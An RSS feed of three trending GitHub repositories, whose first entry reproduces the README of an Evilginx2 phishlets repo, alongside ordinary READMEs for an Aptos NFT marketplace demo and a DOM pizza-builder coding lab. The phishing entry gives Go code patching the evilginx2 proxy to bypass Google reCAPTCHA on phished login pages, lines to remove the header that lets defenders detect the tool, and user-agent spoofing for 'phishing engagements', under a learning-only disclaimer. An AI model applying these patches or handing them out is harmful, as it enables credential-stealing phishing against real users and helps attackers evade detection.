<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub CSS Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-28T01:32:36Z</updated>
  <subtitle>Daily Trending of CSS in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>An0nUD4Y/Evilginx2-Phishlets</title>
    <updated>2022-10-28T01:32:36Z</updated>
    <id>tag:github.com,2022-10-28:/An0nUD4Y/Evilginx2-Phishlets</id>
    <link href="https://github.com/An0nUD4Y/Evilginx2-Phishlets" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Evilginx2 Phishlets version (0.2.3) Only For Testing/Learning Purposes&lt;/p&gt;&lt;hr&gt;&lt;h3&gt;This Repo is Only For Learning Purposes. Use These Phishlets To learn and create Your Own.&lt;/h3&gt; &#xA;&lt;h1&gt;Phishlets Developemnt Tips&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Always Use Debug Mode in evilginx During Testing&lt;/li&gt; &#xA; &lt;li&gt;Not Everything is Working Here, Use these Phishlets to learn and to Play with Evilginx.&lt;/li&gt; &#xA; &lt;li&gt;Be Creative when it comes to bypassing protection.&lt;/li&gt; &#xA; &lt;li&gt;Javascript Injection can fix a lot of issues and will make your life easier during phishing engagements.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Some Less Known Techniques&lt;/h1&gt; &#xA;&lt;h3&gt;Google Recaptcha Bypass by &lt;a href=&#34;https://twitter.com/Desire50627362&#34;&gt;@Desire&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Google recaptcha encodes domain in base64 and includes it in &lt;code&gt;co&lt;/code&gt; parameter in GET request.&lt;/li&gt; &#xA; &lt;li&gt;For Example in Binance us Login. &lt;pre&gt;&lt;code&gt;https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;amp;k=6LePlpgbAAAAAPlPfzzXnJ1lrMTqRWgouzDcSd3b&amp;amp;co=aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw..&amp;amp;hl=en&amp;amp;v=vP4jQKq0YJFzU6e21-BGy3GP&amp;amp;size=invisible&amp;amp;cb=knko72z68i8y&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Here the parameter &lt;code&gt;co&lt;/code&gt; contains string &lt;code&gt;co=aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw..&lt;/code&gt; which is the base64 encoding of &lt;code&gt;https://accounts.binance.us:443&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;We can modify this to &lt;code&gt;https://accounts.anydomain.com:443&lt;/code&gt; and encode it in base64 &lt;code&gt;aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw&lt;/code&gt; and replace the parameter with this new value.&lt;/li&gt; &#xA; &lt;li&gt;We should be able to bypass the google recaptcha.&lt;/li&gt; &#xA; &lt;li&gt;Here is the work around code to implement this. Replace the code in evilginx2 &lt;code&gt;core/http_proxy.go&lt;/code&gt; line 409&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#x9;&#x9;&#x9;&#x9;// patch GET query params with original domains &amp;amp; bypass recaptcha&#xA;&#x9;&#x9;&#x9;&#x9;if pl != nil {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;qs := req.URL.Query()&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if len(qs) &amp;gt; 0 {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;for gp := range qs {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;for i, v := range qs[gp] {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;if qs[gp][i] == &#34;aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw..&#34; { // https://accounts.binance.us:443&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;qs[gp][i] = &#34;aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw&#34; // https://accounts.anydomain.com:443&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;req.URL.RawQuery = qs.Encode()&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Evilginx2 Easter Egg Patch (X-Evilginx Header)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Evilginx2 contains easter egg code which adds a &lt;code&gt;X-Evilginx&lt;/code&gt; header with each request.&lt;/li&gt; &#xA; &lt;li&gt;This header contains the Attacker Domain name. So it can be used for detection.&lt;/li&gt; &#xA; &lt;li&gt;To remove the Easter egg from evilginx just remove/comment below mentioned lines from the &lt;code&gt;core/http_proxy.go&lt;/code&gt; file.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;// Line 183&#xA;egg2 := req.Host&#xA;&#xA;// Line 350&#xA;hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}  &#xA;&#xA;// Line 407&#xA;req.Header.Set(string(hg), egg2)  &#xA;&#xA;// Line 377 to 379&#xA;for n, b := range hg {&#xA;&#x9;&#x9;hg[n] = b ^ 0xCC&#xA;&#x9;}&#xA;  &#xA;// Line 562 to 566&#xA;e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}&#xA;for n, b := range e {&#xA;&#x9;&#x9;e[n] = b ^ 0x88&#xA;}&#xA;req.Header.Set(string(e), e_host)&#xA;&#xA;// Line 1456 to 1462&#xA;func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {&#xA;&#x9;var b []byte = []byte(&#34;\x1dh\x003,)\&#34;,+=&#34;)&#xA;&#x9;for n, c := range b {&#xA;&#x9;&#x9;b[n] = c ^ 0x45&#xA;&#x9;}&#xA;&#x9;req.Header.Set(string(b), nothing_to_see_here)&#xA;}&#xA;&#xA;// Line 580&#xA;p.cantFindMe(req, e_host)&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Add Custom User Agent&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Few sites have protections based on user agent, and relaying on javascript injections to modify the user agent on victim side may break/slow the attack process.&lt;/li&gt; &#xA; &lt;li&gt;Custom User Agent Can be Added on the fly by replacing the &lt;code&gt;User-Agent&lt;/code&gt; Header in each requests.&lt;/li&gt; &#xA; &lt;li&gt;Below is the work Around Code to achieve this. You can add code in evilginx2 &lt;code&gt;core/http_proxy.go&lt;/code&gt; file below line 395.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#x9;&#x9;&#x9;&#x9;// Replace Any User Agent With Firefox UserAgent&#xA;&#x9;&#x9;&#x9;&#x9;useragent := req.Header.Get(&#34;User-Agent&#34;)&#xA;&#x9;&#x9;&#x9;&#x9;if useragent != &#34;&#34; {                                   &#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;req.Header.Set(&#34;User-Agent&#34;, &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&#34;)&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;log.Debug(&#34;[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/96.0 &#34;, ps.Index)&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Error Resolving&lt;/h1&gt; &#xA;&lt;h3&gt;Error-1 : (Failed to start nameserver on port 53)&lt;/h3&gt; &#xA;&lt;p&gt;METHOD 1 :-&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Follow These Commands &amp;amp; Then Try Relaunching Evilginx&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo service systemd-resolved stop&#xA;nano /etc/resolv.conf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Then change nameserver 127.x.x.x to nameserver 8.8.8.8&lt;/li&gt; &#xA; &lt;li&gt;Then save the file (By pressing CTRL+X and pressing Y followed by enter)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;METHOD 2 :-&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Check if All the neccessary ports are not being used by some other services.&lt;/li&gt; &#xA; &lt;li&gt;Ports Like: 80, 53, 443&lt;/li&gt; &#xA; &lt;li&gt;Find Those Ports And Kill those Processes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo netstat -ptnl | grep 53&#xA;sudo kill PID&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Where PID is Process ID&lt;/li&gt; &#xA; &lt;li&gt;Similarly Find And Kill Process On other Ports That are in use.&lt;/li&gt; &#xA; &lt;li&gt;Now Try To Run Evilginx and get SSL certificates&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Need any Help ??&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Regarding phishlets for Penetration testing.&lt;/li&gt; &#xA; &lt;li&gt;Help with phishlet issues or anything.&lt;/li&gt; &#xA; &lt;li&gt;Can Help regarding projects related to Reverse Proxy.&lt;/li&gt; &#xA; &lt;li&gt;Contact Me on telegram: &lt;a href=&#34;https://t.me/its_udy&#34;&gt;https://t.me/its_udy&lt;/a&gt; (This is the only account belong to me)&lt;/li&gt; &#xA; &lt;li&gt;Please be aware of anyone impersonating my handle ( @an0nud4y is not my telegram handle)&lt;/li&gt; &#xA; &lt;li&gt;You can also contact me on twitter (&lt;a href=&#34;https://an0nud4y.com&#34;&gt;https://an0nud4y.com&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;WARNING !&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DEVELOPER WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THE PHISHLETS. THESE PHISHLETS ARE ONLY FOR TESTING/LEARNING/EDUCATIONAL/SECURITY PURPOSES.&lt;/li&gt; &#xA; &lt;li&gt;DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.&lt;/li&gt; &#xA; &lt;li&gt;RELEASED THE WORKING/NON-WORKING PHISHLETS JUST TO LET OTHERS LEARN AND FIGURE OUT VARIOUS APPROACHES.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Amovane/aptos-NFT-marketplace</title>
    <updated>2022-10-28T01:32:36Z</updated>
    <id>tag:github.com,2022-10-28:/Amovane/aptos-NFT-marketplace</id>
    <link href="https://github.com/Amovane/aptos-NFT-marketplace" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A full stack demo NFT marketplace based on aptos devnet.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Demo NFT marketplace&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/Amovane/aptos-NFT-marketplace/main/pics/logo.svg?sanitize=true&#34; height=&#34;150&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;A full stack demo NFT marketplace based on aptos devnet. Aiming for clean and cocise code that is easy to understand and also make some automations to speed up full stack development.&lt;/p&gt; &#xA;&lt;h2&gt;Tech stack&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Lang: Move, Typescript&lt;/li&gt; &#xA; &lt;li&gt;Frontend: &lt;a href=&#34;https://nextjs.org/&#34;&gt;Next.js&lt;/a&gt;, &lt;a href=&#34;https://tailwindcss.com&#34;&gt;tailwindcss&lt;/a&gt;, &lt;a href=&#34;https://daisyui.com&#34;&gt;daisyui&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Backend: &lt;a href=&#34;https://supabase.com&#34;&gt;Supabase&lt;/a&gt;, &lt;a href=&#34;https://prisma.io&#34;&gt;Prisma&lt;/a&gt;, &lt;a href=&#34;https://rxjs.dev/&#34;&gt;Rxjs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;h3&gt;Contract&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Compile move module&lt;/p&gt; &lt;pre&gt;&lt;code&gt;NAME=&amp;lt;name&amp;gt; ADDRESS=&amp;lt;address&amp;gt; yarn workspace market-contracts move:compile&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Publish move module&lt;/p&gt; &lt;pre&gt;&lt;code&gt;NAME=&amp;lt;name&amp;gt; ADDRESS=&amp;lt;address&amp;gt; yarn workspace market-contracts move:publish&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Frontend&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Installation&lt;/p&gt; &lt;pre&gt;&lt;code&gt;yarn workspace market-frontend install&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Config &lt;code&gt;.env.development.local&lt;/code&gt;&lt;/p&gt; &lt;p&gt;In order to expose a variable to the browser you have to prefix the variable with &lt;code&gt;NEXT_PUBLIC_&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;NEXT_PUBLIC_NFT_STORAGE_KEY=&#xA;NEXT_PUBLIC_WALLET_PRIVATE_KEY=&#xA;NEXT_PUBLIC_MARKET_ADDRESS=0x64f236ab7ba803a8921c16fa2b9995da51033e3ed2e284e358f0d5431a39c0d0&#xA;NEXT_PUBLIC_MARKET_NAME=_1200_dollars_per_hour&#xA;NEXT_PUBLIC_MARKET_FEE_NUMERATOR=10&#xA;NEXT_PUBLIC_MARKET_INITIAL_FUND=10000&#xA;NEXT_PUBLIC_MARKET_COIN_TYPE=0x1::aptos_coin::AptosCoin&#xA;NEXT_PUBLIC_APTOS_NODE_URL=https://fullnode.devnet.aptoslabs.com/v1/&#xA;NEXT_PUBLIC_APTOS_FAUCET_URL=https://faucet.devnet.aptoslabs.com/v1/&#xA;NEXT_PUBLIC_SUPABASE_KEY=&#xA;NEXT_PUBLIC_SUPABASE_URL=&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Read more on &lt;a href=&#34;https://nextjs.org/docs/basic-features/environment-variables&#34;&gt;https://nextjs.org/docs/basic-features/environment-variables&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Run script for create market&lt;/p&gt; &lt;pre&gt;&lt;code&gt;NODE_ENV=development yarn workspace market-frontend aptos:create-market&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Run dev&lt;/p&gt; &lt;pre&gt;&lt;code&gt;yarn workspace market-frontend dev&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Backend&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Setup&lt;/p&gt; &lt;pre&gt;&lt;code&gt;// install all the dependencies listed within package.json&#xA;yarn workspace market-backend install&#xA;&#xA;// set up a new Prisma project&#xA;yarn workspace market-backend prisma init&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Config &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;DATABASE_URL=&amp;lt;YOUR SUPABASE DB URL&amp;gt;&#xA;APTOS_NODE_URL=https://fullnode.devnet.aptoslabs.com/v1/&#xA;APTOS_FAUCET_URL=https://faucet.devnet.aptoslabs.com/&#xA;MARKET_ADDRESS=&amp;lt;YOUR MARKET ACCOUNT&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;DB Migration&lt;/p&gt; &lt;pre&gt;&lt;code&gt;// create migrations from your Prisma schema, apply them to the database&#xA;yarn workspace market-backend prisma migrate dev --name &amp;lt;new-file-suffix&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Run&lt;/p&gt; &lt;pre&gt;&lt;code&gt;yarn workspace market-backend start&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>ironhack-labs/lab-dom-pizza-builder</title>
    <updated>2022-10-28T01:32:36Z</updated>
    <id>tag:github.com,2022-10-28:/ironhack-labs/lab-dom-pizza-builder</id>
    <link href="https://github.com/ironhack-labs/lab-dom-pizza-builder" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/23629340/40541063-a07a0a8a-601a-11e8-91b5-2f13e4e6b441.png&#34; alt=&#34;logo_ironhack_blue 7&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;LAB | DOM Pizza Builder&lt;/h1&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=04MJIXcZKPk&#34;&gt;&lt;img src=&#34;https://i.giphy.com/e2AKpOvx2MREY.gif&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;We have got the munchies for a nice, fresh pie of pizza. Of course, we want to order online. After all, talking to a person will only delay the consumption of pizza.&lt;/p&gt; &#xA;&lt;p&gt;There is only one problem: our local pizzeria&#39;s pizza builder &lt;strong&gt;is not working&lt;/strong&gt;. This time, the local pizzeria is in luck because their customer today is a Web developer. We always hear about how developers should give back to their community. I can&#39;t think of a more meaningful contribution than helping the community get pizza more easily.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;You can find a demo of the finished version by clicking &lt;a href=&#34;https://lab-dom-pizza-builder.surge.sh&#34;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fork this repo&lt;/li&gt; &#xA; &lt;li&gt;Clone this repo&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Submission&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Upon completion, run the following commands:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git add .&#xA;$ git commit -m &#34;Solved lab&#34;&#xA;$ git push origin master&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create Pull Request so your TAs can check up your work.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Automated Tests&lt;/h2&gt; &#xA;&lt;p&gt;This lab includes an automated testing suite. For DOM-related labs, our automated tests should be seen as a secondary tool, that helps you to programmatically understand whether your solution is correct and allows the educational team to track your progress.&lt;/p&gt; &#xA;&lt;p&gt;To run the automated tests, please, open your terminal, change directories into the root of the lab, and run &lt;code&gt;npm install&lt;/code&gt; to install the test runner. Now, you can run the &lt;code&gt;npm run test:watch&lt;/code&gt; command to run automated tests in watch mode. Open the resulting &lt;code&gt;lab-solution.html&lt;/code&gt; file with the &#34;Live Server&#34; VSCode extension to always see the most up-to-date test results.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Instructions&lt;/h2&gt; &#xA;&lt;p&gt;We will only work with the &lt;code&gt;js/index.js&lt;/code&gt; file. As you will see, the file contains some code. The file is built to have a &lt;a href=&#34;https://en.wikipedia.org/wiki/Separation_of_concerns&#34;&gt;separation of concerns&lt;/a&gt; and make the code scalable. This architecture is very close to what you will use with React.&lt;/p&gt; &#xA;&lt;p&gt;In this architecture, there is a variable &lt;code&gt;state&lt;/code&gt; with different values, such as &lt;code&gt;pepperoni&lt;/code&gt; initially set to &lt;code&gt;true&lt;/code&gt;. When the user clicks on it, the value will be changed to the opposite (example: &lt;code&gt;false&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;In this architecture, there is also a function &lt;code&gt;renderEverything&lt;/code&gt; that renders the pizza, the buttons, and the price based on the state. This function should run every time the state is changed, because the pizza, the buttons, and the price must be changed. To give an example, when &lt;code&gt;state.pepperoni&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt;, the function will:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;make the pepperoni on the pizza visible,&lt;/li&gt; &#xA; &lt;li&gt;add a class &lt;code&gt;active&lt;/code&gt; to the &#34;pepperoni&#34; button,&lt;/li&gt; &#xA; &lt;li&gt;update the price panel.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Iteration 1: Add and remove toppings&lt;/h3&gt; &#xA;&lt;p&gt;There are five buttons on the left of the pizza builder. Three of those have to add or remove toppings from the pizza. Write the necessary JavaScript for those three buttons to &lt;strong&gt;add and remove pepperoni, mushrooms, and green peppers&lt;/strong&gt; from the pizza. &lt;strong&gt;Don&#39;t worry about updating the price&lt;/strong&gt;. We will do it later.&lt;/p&gt; &#xA;&lt;p&gt;Each individual topping has its own HTML element.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- When this button is clicked --&amp;gt;&#xA;&amp;lt;button class=&#34;btn btn-pepperoni active&#34;&amp;gt;Pepperoni&amp;lt;/button&amp;gt;&#xA;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&#xA;&amp;lt;!-- Hide/show all the following sections at the same time --&amp;gt;&#xA;&amp;lt;section class=&#34;pep one&#34;&amp;gt;1&amp;lt;/section&amp;gt;&#xA;&amp;lt;section class=&#34;pep two&#34;&amp;gt;2&amp;lt;/section&amp;gt;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- When this button is clicked --&amp;gt;&#xA;&amp;lt;button class=&#34;btn btn-mushrooms active&#34;&amp;gt;Mushrooms&amp;lt;/button&amp;gt;&#xA;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&#xA;&amp;lt;!-- Hide/show all the following sections at the same time --&amp;gt;&#xA;&amp;lt;section class=&#34;mushroom one&#34;&amp;gt;&#xA;  &amp;lt;div class=&#34;cap&#34;&amp;gt;1&amp;lt;/div&amp;gt;&#xA;  &amp;lt;div class=&#34;stem&#34;&amp;gt;&amp;lt;/div&amp;gt;&#xA;&amp;lt;/section&amp;gt;&#xA;&amp;lt;section class=&#34;mushroom two&#34;&amp;gt;&#xA;  &amp;lt;div class=&#34;cap&#34;&amp;gt;2&amp;lt;/div&amp;gt;&#xA;  &amp;lt;div class=&#34;stem&#34;&amp;gt;&amp;lt;/div&amp;gt;&#xA;&amp;lt;/section&amp;gt;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- When this button is clicked --&amp;gt;&#xA;&amp;lt;button class=&#34;btn btn-green-peppers active&#34;&amp;gt;Green peppers&amp;lt;/button&amp;gt;&#xA;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&#xA;&amp;lt;!-- Hide/show all the following sections at the same time --&amp;gt;&#xA;&amp;lt;section class=&#34;green-pepper one&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;&amp;lt;section class=&#34;green-pepper two&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;&amp;lt;!-- ... --&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Create the code to hide/show those elements when the buttons are clicked.&lt;/strong&gt; For this, you will have to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Add click event listener on &lt;code&gt;&amp;lt;button class=&#34;btn btn-mushrooms&#34;&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;button class=&#34;btn btn-green-peppers&#34;&amp;gt;&lt;/code&gt; (pepperoni is already done)&lt;/li&gt; &#xA; &lt;li&gt;Write the code for the functions &lt;code&gt;renderMushrooms()&lt;/code&gt; and &lt;code&gt;renderGreenPeppers()&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Iteration 2: Sauce and crust options&lt;/h3&gt; &#xA;&lt;p&gt;In this iteration, your goal is to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Add click event listener on &lt;code&gt;&amp;lt;button class=&#34;btn btn-sauce&#34;&amp;gt;&lt;/code&gt; and change &lt;code&gt;state.whiteSauce&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Write the function &lt;code&gt;renderWhiteSauce()&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Add click event listener on &lt;code&gt;&amp;lt;button class=&#34;btn btn-crust&#34;&amp;gt;&lt;/code&gt; and change &lt;code&gt;state.glutenFreeCrust&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Write the function &lt;code&gt;renderGlutenFreeCrust()&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;As you can see, the initial value for &lt;code&gt;state.whiteSauce&lt;/code&gt; and &lt;code&gt;state.glutenFreeCrust&lt;/code&gt; is false. The reason is that, by default, we want a pizza with pepperoni, mushrooms, green peppers but no white sauce nor gluten-free crust.&lt;/p&gt; &#xA;&lt;p&gt;For now, &lt;strong&gt;don&#39;t worry about updating the price&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- Example of a pizza with white-sauce and a gluten-free crust --&amp;gt;&#xA;&amp;lt;section class=&#34;crust crust-gluten-free&#34;&amp;gt;&#xA;  &amp;lt;section class=&#34;cheese&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;  &amp;lt;section class=&#34;sauce sauce-white&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;&amp;lt;/section&amp;gt;&#xA;&#xA;&amp;lt;!-- Example of a pizza with no white-sauce and no gluten-free crust --&amp;gt;&#xA;&amp;lt;section class=&#34;crust&#34;&amp;gt;&#xA;  &amp;lt;section class=&#34;cheese&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;  &amp;lt;section class=&#34;sauce&#34;&amp;gt;&amp;lt;/section&amp;gt;&#xA;&amp;lt;/section&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Iteration 3: Make the buttons active or not&lt;/h3&gt; &#xA;&lt;p&gt;Currently, all buttons look the same, no matter if the option is activated or not. If you notice, all the buttons have an &lt;code&gt;active&lt;/code&gt; class.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;button class=&#34;btn btn-pepperoni active&#34;&amp;gt;Pepperoni&amp;lt;/button&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Write the logic for removing and adding the buttons&#39; &lt;code&gt;active&lt;/code&gt; class appropriately. Write the code in the function &lt;code&gt;renderButtons()&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;Iteration 4: Ingredients and prices&lt;/h3&gt; &#xA;&lt;p&gt;On the right side of the pizza builder, there is a price section.&lt;/p&gt; &#xA;&lt;p&gt;Write the function &lt;code&gt;renderPrice()&lt;/code&gt; that:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Displays the list of all items selected&lt;/li&gt; &#xA; &lt;li&gt;Displays the total price.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;p&gt;&lt;strong&gt;Happy coding!&lt;/strong&gt; 💙&lt;/p&gt;</summary>
  </entry>
</feed>